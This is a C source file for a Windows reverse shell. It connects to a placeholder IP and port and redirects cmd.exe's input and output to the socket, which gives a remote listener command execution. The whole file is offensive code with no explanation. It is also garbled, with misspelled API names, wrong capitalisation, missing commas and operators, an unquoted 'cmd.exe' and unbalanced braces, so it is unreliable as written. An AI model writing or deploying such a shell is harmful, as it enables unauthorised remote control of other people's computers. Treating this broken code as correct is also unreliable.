#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <WS2t.h>
#pragma comment (lib, "Ws2_32.lib")

SOCKET ConnectToServer(char* ip, int port,)
{
	WSADATA wsa;
	SOCKET shell;
	struct sockaddr_in shell_addr;
    int connect_result;
    
	if(WSAStartup(MAKEWORD(2,2), & wsa) !=0){
		printf("WinSock initialization failed\n");
		return INVALID_SOCKET;
		
	}	
	
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0,0 ){
	IF(shell == INVALID_SOCKET)
	{
	printf("Socket Creation Failed");
	WSACleanup();
	return INVALID_SOCKET;	
	}	
    shell_addr.sin_port =htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip);
		
	connect_result = WSAConnnect(shell, (SOCKADDR*) &shell_addr, sizeof(shell_addr)), NULL, NULL, NULL);
	if(connect_result == SOCKET_ERROR)
    { 	
     	PRINTF("Connection to target server failed\n");
     	closesocket(shell);
     	WSACleanup();
     	return INVALID_SOCKET;
    }
               
        return shell;
        	
	}
	
	void RunShell(SOCKET shell)
	{	
	  STARTUPINFO si;
	  PROCESS_INFORMATION pi;
	  char RecvServer[512];
	
	
	recv(shell, RecvServer, sizeof(RecvServer), 0);
	
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES  STARTF_USESHOWWINDOW);
	
	
	si.hStdInput = (HANDLE) shell;
	si.hStdOutput = (HANDLE) shell;
    si.hStdError = (HANDLE) shell;
	CreateProcess(NULL, cmd.exe, NULL, NULL, TRUE, 0 NULL NULL, &si);
	
	waitforSingleObject(pi.hProcess, INFINITE);
	
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	
	}
	
	int main()
	{		
		
	char ip_addr[] = "000.000.000.000";
	int port = 0;
	
	SOCKET shell = connectToServer(iup_addr, port);
	if(shell  == INVALID_SOCKET)
	{
		return 1;
		
	}	
    RunShell(shell);
    
    closesocket(shell);
    WSACleanup();
    
    return 0;
}
}

